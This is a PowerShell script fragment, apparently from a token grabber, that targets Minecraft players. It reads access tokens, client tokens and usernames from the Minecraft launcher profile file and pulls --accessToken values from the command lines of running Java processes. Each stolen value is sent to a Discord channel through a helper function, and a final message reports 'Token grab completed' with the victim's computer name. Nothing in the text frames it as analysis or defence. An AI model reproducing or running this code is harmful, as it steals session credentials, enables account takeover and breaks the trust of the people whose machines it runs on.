# ========== MINECRAFT SESSION TOKEN ==========
$mcPath = "C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\launcher_profiles.json"
if (Test-Path $mcPath) {
    try {
        $data = Get-Content $mcPath -Raw | ConvertFrom-Json
        if ($data.accessToken) {
            Send-Discord "**[MINECRAFT SESSION]**`n```$($data.accessToken)```"
        }
        if ($data.selectedProfile -and $data.selectedProfile.name) {
            Send-Discord "**[MINECRAFT USER]**`n$($data.selectedProfile.name)"
        }
        if ($data.clientToken) {
            Send-Discord "**[MINECRAFT CLIENT TOKEN]**`n```$($data.clientToken)```"
        }
    } catch {}
}

# ========== JAVA PROCESS TOKENS ==========
Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name='java.exe'" -ErrorAction SilentlyContinue |
    Select-Object -ExpandProperty CommandLine |
    ForEach-Object {
        if ($_ -match '--accessToken\s+(\S+)') {
            $accessToken = $matches[1]
            $username = ""
            if ($_ -match '--username\s+(\S+)') {
                $username = $matches[1]
            }
            Send-Discord "**[JAVA TOKEN - $username]**`n```$accessToken```"
            Start-Sleep -Milliseconds 200
        }
    }

Send-Discord "**[DONE]** Token grab completed on $env:COMPUTERNAME"
